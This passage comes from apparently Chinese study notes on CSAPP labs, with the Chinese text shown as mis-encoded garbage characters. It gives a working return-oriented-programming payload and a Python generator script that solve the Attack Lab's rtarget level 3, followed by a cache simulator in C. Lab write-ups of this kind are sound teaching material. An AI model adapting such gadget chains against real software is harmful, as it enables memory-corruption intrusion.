           result  1:PASS:0xffffffff:rtarget:2:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
   ```

   

ğŸ”µPhase 5

å­—ç¬¦ä¸² "59b997fa" å¯¹åº”çš„äºŒè¿›åˆ¶å½¢å¼ä¸ºï¼š

```
0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61
```

```assembly
movq %rsp, %rax
popq %rdi
movq %rax, %rdi
```

æ€è·¯ï¼šå…³é”®å°±æ˜¯å¦‚ä½•æ‰¾åˆ°å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ä¼ ç»™ rdiï¼Œä»¥åŠæ¢³ç†å·²ç»™æ¡ä»¶ã€‚

å·²ç»™æ¡ä»¶ï¼š

1. `movq` æŒ‡ä»¤ï¼š
   * movq %rax, %rdi     0x4019a2
   * movq %rsp, %rax     0x401a06
2. `movl` æŒ‡ä»¤ï¼š
   * movl %eax, %edi     0x4019a3
   * movl %eax, %edx     0x4019dd
   * movl %esp, %eax
   * movl %ecx, %esi     0x401a13
   * movl %edx, %ecx     0x401a34
3. `popq` æŒ‡ä»¤ï¼š
   * popq %rax  0x4019ab
4. `lea` æŒ‡ä»¤
   * lea (%rdi,%rsi,1),%rax     0x4019d6

å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºéœ€è¦ä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œå› æ­¤ä½¿ç”¨è¯­å¥ `movq %rsp, %rax` ç„¶å retï¼šå¦‚æœä½ç½®åœ¨ %rsp æ‰€æŒ‡ä½ç½®ï¼Œé‚£ä¹ˆ ret å¯èƒ½è¿”å›åˆ°ä¸€ä¸ªæ— æ•ˆåœ°å€ï¼Œå› æ­¤è¯æ˜å­—ç¬¦ä¸²æ•°æ®å¿…é¡»åœ¨æ‰€æœ‰ gadget åœ°å€ä¹‹åã€‚å¹¶ä¸” farm ä¸­æä¾›äº†åŠ æ³•è¿ç®—ï¼Œå› æ­¤éœ€è¦è®©æˆ‘ä»¬æœ€ç»ˆè®¡ç®—å­—ç¬¦ä¸²æ•°æ®çš„åœ°å€ã€‚

![image-20220908153112903](csapp.assets/image-20220908153112903.png)

å› æ­¤å¤§è‡´æ€è·¯å¦‚ä¸Šï¼Œè®¡ç®—å¾—åˆ° length éƒ¨åˆ†ä¸º 0x20ã€‚

å› æ­¤ payloads ä¸ºï¼š

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

ç¼–å†™è„šæœ¬ï¼š

```python
import struct

payloads = [0x61] * 40;
payloads = payloads + [
        0xab, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xdd, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x34, 0x1a, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x13, 0x1a, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x06, 0x1a, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xa2, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xd6, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xa2, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xfa, 0x18, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x00]

with open('touch5.txt', 'wb') as f:
    for x in payloads:
        f.write(struct.pack('B', x))

print('Done')
```

æœ€ç»ˆ passï¼š

```sh
$ ./rtarget -q -i touch5.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

### 4. Cache lab

lab åˆ†ä¸ºä¸¤ä¸ªå°å®éªŒï¼š

1. æ¨¡æ‹Ÿå®ç°é«˜é€Ÿç¼“å­˜ï¼ˆ200-300è¡Œä»£ç ï¼‰cache simulator

   å…¶å®å°±æ˜¯å¯¹è¯¾å ‚çŸ¥è¯†çš„å·©å›ºï¼Œä½¿ç”¨ä»£ç çš„å½¢å¼æ¥è¿›ä¸€æ­¥äº†è§£ç¼“å­˜çš„å·¥ä½œåŸç†ã€‚

   > å¯ä»¥è¿›ä¸€æ­¥äº†è§£ n è·¯ç»„ç›¸è”æ˜ å°„ï¼Œä»¥åŠ LRU çš„ä½¿ç”¨åœºæ™¯ã€‚

   CSAPP å°†é«˜é€Ÿç¼“å­˜è¿™ä¸€èŠ‚è®²å¾—å¥½çš„åŸå› å°±æ˜¯æœ‰ setã€lineã€block çš„æ¦‚å¿µï¼Œé€šè¿‡ CPU å‘é€çš„åœ°å€å°†å…¶è§£æä¸º tagã€set index ä»¥åŠ block offsetï¼Œæ ¹æ®è§£æåçš„æ•°æ®å®šä½åˆ°ç¼“å­˜çš„ä½ç½®ã€‚å¦‚æœç¼“å­˜ä¸­æ¯ä¸ª set æœ‰å¤šä¸ª line å¹¶ä¸” line éƒ½è¢«å ç”¨çš„æ—¶å€™ï¼Œå°±éœ€è¦ä½¿ç”¨ LRU ç®—æ³•æ·˜æ±°æ‰æœ€ä¹…æœªè®¿é—®è¿‡çš„ lineã€‚

   Cache æ˜¯ç”±ä¸€ä¸ªä¸ª Block æ„æˆï¼Œå› æ­¤å®šä¹‰ï¼š

   ```c
   typedef struct {
       bool v;			// valid flag
       int tag;		// tag
       bool* data;		// data
       int version;	// For LRU evict.
   } Block;
   
   typedef Block* Cache;
   ```

   å…¶ä¸­å‰ä¸‰ä¸ªå±æ€§æ˜¯ Block ä¸­å¿…è¦çš„å±æ€§ï¼Œç¬¬å››ä¸ªå±æ€§ version ç”¨äºæ ‡è®°å½“å‰ set ä¸­çš„æ›´æ–°æ—¶é—´ï¼Œè¶Šå¤§è¡¨ç¤ºæ•°æ®è¶Šæ–°ï¼Œç”¨äº LRU ç®—æ³•æ¥æ·˜æ±°æ—§çš„ Blockã€‚

   è§£æåœ°å€ï¼š

   ```c
   long addr = op[i].addr;
   int set = (addr >> arg.b) & ((1 << arg.s) - 1);
   int tag = addr >> (arg.b + arg.s);
   ```

   æ ¹æ®é¢˜ç›®è¦æ±‚çš„ 4 ä¸ªæ“ä½œï¼ŒL è¡¨ç¤ºåŠ è½½æ•°æ®ï¼ŒI è¡¨ç¤ºåŠ è½½æŒ‡ä»¤ï¼ŒS è¡¨ç¤ºå­˜å‚¨æ•°æ®ï¼ŒM è¡¨ç¤ºä¿®æ”¹æ•°æ®ã€‚

   åœ¨å¯¹ CPU å‘é€æ¥çš„åœ°å€è¿›è¡Œè§£æåï¼Œå°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ setã€‚ç”±äºä½¿ç”¨ LRU æ·˜æ±°ç®—æ³•ï¼Œå› æ­¤éœ€è¦å¯¹ set ä¸­æ‰€æœ‰çš„ line è¿›è¡Œç‰ˆæœ¬å·æ¯”è¾ƒï¼Œæ·˜æ±°æœ€ä½çš„ç‰ˆæœ¬å·ï¼Œå¹¶ä¸”å¯¹æ“ä½œçš„ block èµ‹å€¼æœ€æ–°çš„ç‰ˆæœ¬å·ã€‚

   å¦‚æœåœ¨è¿™ä¸ª set ä¸­å¯¹æ¯”æœ‰æ•ˆä½å’Œ tag éƒ½ä¸€è‡´ï¼Œå°±è¡¨ç¤º hit ç¼“å­˜å‘½ä¸­ã€‚

   ```c
   // lines index range: [set * E, (set+1)*E)
   // Firstly, replace the block which has the most small version number in this set
   // Set the biggest version number + 1 as the pertinent block's version number.
   int minv = 0x7fffffff, maxv = -1, iminv = 0;;
   bool found = false;
   int found_idx = 0;
   for(int j = set * arg.e; j < (set+1)*arg.e; j++) {
       // minv = min(minv, cache[j].v);
       if (cache[j].version < minv) {
           iminv = j;
           minv = cache[j].version;
       }
       maxv = max(maxv, cache[j].version);
       if(cache[j].version && tag == cache[j].tag) {
           found = true;
           found_idx = j;
           hit++;
       }
   }
   ```

   ç”±äº M æ“ä½œï¼Œæœ€ç»ˆè¿˜éœ€è¦å†™å›/ç›´å†™æ•°æ®åˆ°å†…å­˜ï¼Œå› æ­¤è¿˜ä¼š hit ä¸€æ¬¡ï¼›å¯¹äºå…¶ä»–æ“ä½œï¼Œå¦‚æœ block å·²å­˜åœ¨å…¶ä»–æ•°æ®çš„æƒ…å†µä¸‹æœªå‘½ä¸­ï¼Œä¼šå¯¹ block æ•°æ®è¿›è¡Œæ¸…é™¤ evictï¼Œå› æ­¤å¯¹äºæ“ä½œçš„åˆ¤æ–­é€»è¾‘ä¸ºï¼š

   ```c
   int op_idx = found ? found_idx: iminv;
   // printf("%c %llx,%d ", op[i].t, op[i].addr, op[i].size);
   if(op[i].t == 'M')hit++;
   if (!found) {
       miss++;
       if (cache[iminv].v) evict++;
   }
   ```

   æœ€ç»ˆæ›´æ–°æ“ä½œçš„ block çš„å±æ€§ï¼ˆæœ‰æ•ˆä½ï¼Œtag ä»¥åŠç‰ˆæœ¬å·ï¼‰ï¼š

   ```c
   cache[op_idx].v = true;
   cache[op_idx].tag = tag;
   cache[op_idx].version = maxv + 1;
   ```

   

2. ä¼˜åŒ–çŸ©é˜µè½¬ç½®å‡½æ•°ï¼Œæ¥é™ä½ç¼“å­˜æœªå‘½ä¸­ç‡ ï¼ˆBlocking æŠ€æœ¯ï¼‰
